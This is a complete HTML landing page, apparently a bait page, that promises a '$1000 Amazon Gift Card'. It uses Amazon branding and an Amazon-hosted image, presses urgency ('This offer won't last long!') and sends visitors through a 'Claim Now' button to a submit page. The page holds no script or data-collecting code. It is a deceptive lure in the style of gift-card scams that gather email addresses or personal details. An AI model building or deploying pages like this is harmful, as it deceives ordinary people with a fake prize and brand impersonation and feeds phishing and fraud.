<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>$1000 Amazon Gift Card</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body { font-family: 'Poppins', sans-serif; background: #eef5f8; color: #333; margin: 0; padding: 0; }
    .wrapper { display: flex; justify-content: center; padding: 40px 16px; }
    .card {
      background: #fff; border-radius: 16px; padding: 34px 24px 40px;
      max-width: 500px; width: 100%;
      box-shadow: 0 12px 24px rgba(0, 0, 0, 0.08); text-align: center;
    }
    h1 { font-size: 32px; color: #e48c00; margin-bottom: 12px; font-weight: 600; }
    .tagline { font-size: 18px; margin-bottom: 22px; line-height: 1.6; }
    .gift-img { width: 100%; max-width: 380px; margin: 0 auto 28px; border-radius: 8px; }
    a button {
      background: #e7a308; color: #fff; font-size: 20px; font-weight: 600;
      padding: 14px 0; border: none; border-radius: 8px; cursor: pointer;
      transition: 0.25s; width: 100%;
    }
    a button:hover { background: #d49105; }
  </style>
</head>
<body>
  <div class="wrapper">
    <div class="card">
      <h1>Win a $1000 Amazon Gift Card!</h1>
      <p class="tagline">Enter your email below and claim your chance. This offer won’t last long!</p>
      <img class="gift-img" src="https://m.media-amazon.com/images/G/01/gc/designs/livepreview/amazon_dkblue_noto_email_v2016_us-main._CB468775337_.png" alt="Amazon Gift Card">
      <a href="submit.html"><button>Claim Now</button></a>
    </div>
  </div>
</body>
</html>
